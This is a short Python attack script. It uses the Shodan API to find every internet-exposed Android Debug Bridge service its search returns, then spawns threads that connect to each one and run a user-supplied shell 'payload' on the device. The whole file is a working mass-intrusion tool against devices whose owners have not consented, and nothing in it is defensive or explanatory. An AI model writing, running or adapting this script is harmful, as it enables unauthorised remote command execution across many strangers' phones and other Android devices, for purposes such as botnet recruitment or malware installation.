import threading, time
from shodan import Shodan
from colorama import Fore
from adb_shell.adb_device import AdbDeviceTcp, AdbDeviceUsb
from adb_shell.auth.sign_pythonrsa import PythonRSASigner

api = Shodan('YOUR KEY')
payload = input('Payload : ')

def Connection(host, port, payload):
    try:
        print(f'{Fore.GREEN}[ CONNE ]{Fore.MAGENTA} {host}{Fore.GREEN}:{Fore.MAGENTA}{port}\n')
        device = AdbDeviceTcp(host=host, port=port, default_transport_timeout_s=9)
        device.connect(auth_timeout_s=0.5)
        device.shell(command=str(payload))
    except:
        print(f'{Fore.RED}[ ERROR ]{Fore.MAGENTA} {host}{Fore.RED}:{Fore.MAGENTA}{port}\n')

def Main(payload):
    for example in api.search_cursor('"Android Debug Bridge"'):
        try:
            host = example['ip_str'].rstrip()
            port = example['port']
            threading.Thread(target=Connection, args=(host, port, payload)).start()
        except Exception as e:
            exit(e)

Main(payload)â€Š
